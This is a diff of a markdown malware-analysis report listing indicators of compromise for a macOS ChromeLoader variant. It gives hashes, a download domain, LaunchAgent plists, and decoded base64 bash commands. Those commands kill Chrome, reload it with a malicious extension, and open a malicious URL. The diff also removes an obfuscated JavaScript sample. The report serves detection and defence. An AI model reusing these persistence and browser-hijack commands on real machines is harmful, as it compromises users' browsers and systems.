@@ -1,41 +1,43 @@
 # Observed malicious IOCs for the MAC Choziosi Loader (ChromeLoader) Malware
 
-### Date of first occurrence
+## Date of first occurrence
 First observed 04-23
 
-### Description
+## Description
 
-A new variant of ChoziosiLoader for Mac has been observed.  The new variant was initially reported by twitter user @th3_protoCOL via Twitter post https://twitter.com/th3_protoCOL/status/1519362330244444160.
+A new variant of ChoziosiLoader for Mac has been observed.  The new variant was initially reported by twitter user @th3_protoCOL via Twitter post
+
+https://twitter.com/th3_protoCOL/status/1519362330244444160.
 
 For a full breakdown analysis of Mac-ChoziosiLoader please refer to th3protocol's blog post (@th3_protoCOL).
 
 https://www.th3protocol.com/2022/Choziosi-Loader
 
-### Observed IOCs
+## Observed IOCs
 
-The malicious installer is downloaded via malvertisement.  Once the installer is downloaded to disk `Your File Is Ready To Download.dmg`.
+The victim is enticed into downloading a malicious disk image file to disk `Your File Is Ready To Download.dmg`.
 
-Reported Hashes for `Your File Is Ready To Download.dmg` which are assiated with ChoziosiLoader
+File Hashes for `Your File Is Ready To Download.dmg`
 
 ```
 4e2f29a93c52f523680f90a88d65b6dd2f81cc55f80c456cd411af994d044c3c
 ```
 
-https://www.virustotal.com/gui/file/4e2f29a93c52f523680f90a88d65b6dd2f81cc55f80c456cd411af994d044c3c/behavior
-
-The installer is then mounted to disk as `Application Installer`.  A bash script named `ChromeInstaller.command` is then executed.  
+The disk image is then mounted to disk as `Application Installer`.  A bash script `ChromeInstaller.command` is then executed.  
 
 `/Volumes/Application Installer/ChromeInstaller.command`
 
-Reported Hashes for `ChromeInstaller.command`:
+File Hashes for `ChromeInstaller.command`
 
 ```
 ea372007cc140941c76bad138b8088a9b0333d4c3fd31980a141b3026aa69700
 ```
 
-Contents of a sample of `ChromeInstaller.command`.  Sample provided by @th3_protoCOL
+A sample bash script provided by twitter user @th3_protoCOL `ChromeInstaller.command`.
 
 https://bazaar.abuse.ch/sample/5daa07b6c9d3836a864ad9df5773823aa8b3be1470bea93aad0be09c6023cd67/
+
+Contents of `ChromeInstaller.command`
 
 ```bash
 #!/bin/bash
@@ -163,13 +165,13 @@ EOF
 fi
 ```
 
-Domains associated with `ChromeInstaller.command`
+Bash script `ChromeInstaller.command` downloads the malicious extension from a malicious domain.
 
 ```
 yescoolservmate.com
 ```
 
-Once executed the, the script creates three launchagents within the users LaunchAgents directory.
+Bash script `ChromeInstaller.command` also creates three launchagents within the users LaunchAgents directory.
 
 ```
 /Users/<profile>/Library/LaunchAgents
@@ -186,7 +188,9 @@ com.chrome.extensionsPop.plist
 
 ### Launchagent Contents
 
-1. com.chrome.extension.plist. The Launchagent contains a base64 string which is base64 decoded and then executed into bash.
+The Launchagents contains a base64 string which is base64 decoded and then piped into bash.
+
+1. Contents of `com.chrome.extension.plist`. 
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -209,13 +213,15 @@ com.chrome.extensionsPop.plist
 </plist>
 ```
 
-Decoded Base64 string
+Decoded Base64 string shows that the extension is loaded with Google Chrome and ensures that the process is active.  If the process is not active, it will re-initialize the Chrome Extension.
+
 ```bash
 Google Chrome --load-extension'; if ps ax | grep -v grep | grep 'Google Chrome --load-extension' &> /dev/null; then echo e running; else   pkill -a -i 'Google Chrome'; sleep 1 ;  open -a 'Google Chrome' --args --load-extension='/private/var/tmp/D018DB95-ABAB-444F-87DC-13D8F9DAF25F' --restore-last-session --noerrdialogs --disable-session-crashed-bubble; fi;  else echo not running; fi
 ```
 
-2. com.chrome.extensions.plist
+2. Contents of `com.chrome.extensions.plist`
 
+Once again, contains a base64 string with is then bash64 decoded and then piped into bash
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -236,11 +242,16 @@ Google Chrome --load-extension'; if ps ax | grep -v grep | grep 'Google Chrome -
 ```
 
 Decoded Base64 string
+
+Google process is killed, sleeps for 1 second, launches Google Chrome with the malicious extension.
+
 ```bash
 pkill -a -i 'Google Chrome'; sleep 1 ;  open -a 'Google Chrome' --args --load-extension='/private/var/tmp/D018DB95-ABAB-444F-87DC-13D8F9DAF25F' --restore-last-session --noerrdialogs --disable-session-crashed-bubble;
 ```
 
-3. com.chrome.extensionsPop.plist.  The Launchagent contains a base64 string which is base64 decoded and then executed into bash.
+3. Contents of `com.chrome.extensionsPop.plist`. 
+
+The Launchagent contains a base64 string which is base64 decoded and then piped into bash.
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -261,33 +272,36 @@ pkill -a -i 'Google Chrome'; sleep 1 ;  open -a 'Google Chrome' --args --load-ex
 </plist>
 ```
 
-Decoded Base64 string
+The Decoded Base64 string shows that Google Chrome is launched with the malicious extension and a new window is opened which forced the victim to visit a malicious URL.
+
 ```bash
 open -na 'Google Chrome' --args -load-extension='/private/var/tmp/D018DB95-ABAB-444F-87DC-13D8F9DAF25F' --new-window 'https://ationwindon.com/?tid=949115&optid=913393&cook=599881554480138044&agec=1650725231';
 ```
 
-Based on the above information, we can see that 3 seperate bash commands are executed which loads a ChromeExtension stored in the `tmp` directory.  Based on this sample we can see that extension `D018DB95-ABAB-444F-87DC-13D8F9DAF25F` is loaded.  Also one of the extension contains a mal url `https[:]//ationwindon[.]com/?tid=949115&optid=913393&cook=599881554480138044&agec=1650725231`.  The Choziosi loader periodically makes requests to this mal url.
-
-Extension contents
+The Malicious URL which the victim is forced to visit.
 
 ```
+https://ationwindon.com/?tid=949115&optid=913393&cook=599881554480138044&agec=1650725231
+```
+
+https://www.virustotal.com/gui/url/817ab2dac167459bc72571197a3cedea089e6aa1209f0270b2f8fcc7dbb6826e?nocache=1
+
+### The malicious Chrome Extension
+
+Similar to the other CS_installer analysis, the Chrome Extension is dropped to disk and hooked into Chrome.
+```
 /private/var/tmp/D018DB95-ABAB-444F-87DC-13D8F9DAF25F
+
 background.js
 manifest.json
 properties.png
 ```
 
-### The malicious extension loads an obfuscated JavaScript `background.js`
+### The malicious obfuscated Javascript `background.js`
 
 FileName: background.js  
 Hash: 5c950892a285508c87fa1998bd49a85b62fc9fd9362e5740308228b6ea31c95d  
 https://www.virustotal.com/gui/file/5c950892a285508c87fa1998bd49a85b62fc9fd9362e5740308228b6ea31c95d  
-
-### Truncated sample of `background.js`
-
-```
-(function(data){x8ii[88128]=(function(){var n=2;for(;n !== 9;){switch(n){case 1:return globalThis;break;case 2:n=typeof globalThis === '\u006f\x62\x6a\u0065\u0063\x74'?1:5;break;case 5:var x;try{var D=2;for(;D !== 6;){switch(D){case 9:delete x['\x49\u0033\x69\x78\u0069'];var u=Object['\u0070\u0072\u006f\u0074\x6f\x74\x79\x70\x65'];delete u['\x65\u0038\x37\x5f\u0069'];D=6;break;case 2:Object['\u0064\u0065\u0066\x69\u006e\x65\u0050\u0072\u006f\x70\u0065\u0072\x74\x79'](Object['\x70\x72\u006f\x74\u006f\u0074\x79\u0070\u0065'],'\u0065\u0038\x37\x5f\u0069'...SNIP...
-```
 
 ### Raw obfuscated JavaScript sample `background.js`
 
